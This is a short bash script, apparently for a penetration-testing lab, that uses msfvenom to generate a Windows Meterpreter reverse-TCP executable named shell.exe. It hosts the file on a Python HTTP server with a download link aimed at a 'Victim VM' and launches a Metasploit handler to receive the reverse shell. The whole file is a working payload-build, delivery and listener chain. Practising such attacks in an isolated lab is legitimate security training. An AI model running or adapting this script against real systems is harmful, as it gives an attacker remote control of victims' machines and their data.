#!/usr/bin/env bash
# run_lab.sh – Generates shell.exe, hosts it, and opens Metasploit

set -euo pipefail

LHOST=${1:-}
LPORT=${2:-4444}
HTTP_PORT=8000
PAYLOAD_NAME="shell.exe"
PAYLOAD_DIR="$(dirname "$0")/../payloads"
PAYLOAD_PATH="$PAYLOAD_DIR/$PAYLOAD_NAME"

if [[ -z "$LHOST" ]]; then
  read -rp "Enter your Kali IP (LHOST): " LHOST
fi

mkdir -p "$PAYLOAD_DIR"

echo "[+] Generating payload..."
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o "$PAYLOAD_PATH" > /dev/null
echo "[+] Payload saved to $PAYLOAD_PATH"

echo "[+] Starting HTTP server on port $HTTP_PORT..."
(cd "$PAYLOAD_DIR" && python3 -m http.server $HTTP_PORT) &

HTTP_PID=$!
trap "echo '[*] Shutting down HTTP server...'; kill $HTTP_PID" EXIT

echo "[+] Download link (Victim VM): http://$LHOST:$HTTP_PORT/$PAYLOAD_NAME"
echo "[+] Waiting for connection on port $LPORT..."

msfconsole -q -x "
use exploit/multi/handler;
set payload windows/meterpreter/reverse_tcp;
set LHOST $LHOST;
set LPORT $LPORT;
set ExitOnSession false;
exploit -j;
"
